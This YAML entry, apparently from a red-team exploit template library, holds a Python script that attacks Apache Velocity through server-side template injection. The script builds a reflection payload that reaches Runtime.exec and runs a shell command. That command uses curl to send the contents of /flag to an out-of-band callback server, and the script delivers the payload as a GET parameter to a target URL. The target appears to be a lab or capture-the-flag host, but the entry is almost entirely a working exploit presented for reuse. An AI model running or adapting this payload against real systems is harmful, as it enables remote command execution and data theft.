- name: velocity-java-reflection-rce
  description: 基于Velocity模板注入的Java反射RCE手法，适用于Apache Velocity引擎。通过#set和getClass()链绕过对象引用限制，执行任意系统命令。
  lang: python
  template: "import redteam_sdk\n\nTARGET_URL = \"http://host.docker.internal:9443\"\
    \n\ndef main():\n    try:\n        # 1. 初始化带外接收器\n        oob = redteam_sdk.OOBReceiver(port=8765)\n\
    \        callback_url = oob.url\n        print(f\"[*] OOB URL: {callback_url}\"\
    )\n\n        # 2. 构造 Velocity SSTI payload，执行命令并通过 curl 外传结果\n        # 反射调用 Runtime.exec(String[])\
    \ 以使用 shell 解释命令替换\n        payload = (\n            '#set($x=\\'a\\')'\n    \
    \        '#set($str=$x.getClass().forName(\"java.lang.String\"))'\n          \
    \  '#set($rt=$x.getClass().forName(\"java.lang.Runtime\"))'\n            '#set($ex=$rt.getMethod(\"\
    exec\",$str.getClass().forName(\"[Ljava.lang.String;\")))'\n            f'$ex.invoke($rt.getMethod(\"\
    getRuntime\").invoke(null),\"/bin/sh\",\"-c\",\"curl \\'{callback_url}/?flag=$(cat\
    \ /flag)\\'\")'\n        )\n        print(f\"[*] Payload: {payload}\")\n\n   \
    \     # 3. 发送带参数的 GET 请求\n        client = redteam_sdk.HttpClient(base_url=TARGET_URL)\n\
    \        response = client.get(\"/\", params={\"text\": payload})\n        print(f\"\
    [*] Response status: {response.status_code}\")\n\n        # 4. 等待带外回调，获取执行结果\n\
    \        print(\"[*] Waiting for OOB callback...\")\n        data = oob.wait(timeout=10)\n\
    \        if data:\n            print(f\"[+] Received data: {data}\")\n       \
    \ else:\n            print(\"[-] No callback received within timeout.\")\n   \
    \ except Exception as e:\n        print(f\"[-] Error: {e}\")\n\n    # 5. 标记步骤完成\n\
    \    print(\"STEP_OK\")\n\nif __name__ == \"__main__\":\n    main()"
